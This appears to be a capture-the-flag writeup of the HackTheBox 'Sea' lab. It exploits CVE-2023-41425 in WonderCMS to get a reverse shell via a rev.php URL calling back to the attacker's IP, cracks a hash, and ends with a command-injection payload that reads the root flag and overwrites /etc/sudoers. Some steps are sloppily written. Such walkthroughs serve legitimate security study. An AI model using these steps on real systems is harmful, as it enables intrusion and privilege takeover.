---
layout: post
title: "Sea"
date: 2024-08-12 18:58:00 +0100
categories: [writeup, easy]
tags: [machine, xss, cookie stealing]
---

<p>
    <a href="https://app.hackthebox.eu/machines/620">
        <img src="https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png" width="500"
        alt="Descripción">
    </a>
</p>

# Sea writeup

## Table of Contents

1. [Service Enumeration](#1-recon)
2. [Web Recon](#2-web-recon)
3. [Exploiting CVE-2023-41425](#3-cve-2023-41425)
4. [Privilege Escalation](#4-privilege-escalation)

## 1. Recon

<p>
    <img src="assets/img/writeupImgs/sea/1_M7gq-HJ-LX2fGMTnbT2tVg.webp" width="700"
    alt="Descripción">
</p>

We can see port 22 and 80 open, let's start by checking the web service.

## 2. Web Recon

Let's check the service on port 80 with gobuster.

```bash
gobuster dir -u http://10.10.11.28/ -w /usr/share/wordlists/dirb/common.txt
```

We can find a lot of pages, so let's check them one by one.

We can find more relevant info on **/themes**

```bash	
gobuster dir -u http://10.10.11.28/themes/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

With this, we can find that the service is running on **WonderCMS version 3.2.0** which has a CVE assigned to it: [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425?source=post_page-----44b8cbda401b--------------------------------).

## 3. CVE-2023-41425

You need to send a link generated by the exploit before to the admin, so we can upload a revshell.

<p>
    <img src="assets/img/writeupImgs/sea/1_Xo70IuSWVKcjnP64R3K3Sg.webp" width="700"
    alt="Descripción">  
</p>

<p>
    <img src="assets/img/writeupImgs/sea/1_zL5_LAyES2SoJZnrikmGsw.webp" width="700"
    alt="Descripción">
</p>

Now accest to the url with the correct params

```bash	
http://10.10.11.28/themes/revshell-main/rev.php?lhost=<you ip>&lport=1234
```
Now, u are logged as www-data on the machine. 

After this, we need to search how to a user with more privileges.

We can find this on **/var/www/sea/database.js**

<p>
    <img src="assets/img/writeupImgs/sea/1_FdIyMRyN4p7hilNxRioLWA.webp" width="700"
    alt="Descripción">
</p>

Crack this hash with hashcat

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

And log in as that user (**amay**), after this, you can get user flag.

## 4. Privilege Escalation

Run linpeas and you can find Netstat command a networking tool used for troubleshooting and configuration.

<p>
    <img src="assets/img/writeupImgs/sea/1_lCdR_t36smOz_kFg9hk_Kg.webp" width="700"
    alt="Descripción">
</p>

We can see a connection, so open a netcat listener and connect to the port.

```bash
nc -lvp 8888
```

```bash
ssh -L 8888:localhost:8080 amay@10.10.11.28
```

Go to that port and log as amay. Here we can find a developer system monitoring page, so we have some more privileges here.

<p>
    <img src="assets/img/writeupImgs/sea/1_JV_G7qaz_FzuAlo14YprvQ.webp" width="700"
    alt="Descripción">
</p>

We can use burp here, and set this to read flag at **/root/root.txt** whit the following command.

```bash
log_file=/root/root.txt;cp/dev/shm/sudoers> /etc/sudoers&analyze_log
```

<p>
    <img src="assets/img/writeupImgs/sea/1_el1--wwWuZer9MkOJSZh_A.webp" width="700"
    alt="Descripción">
</p>

Done!!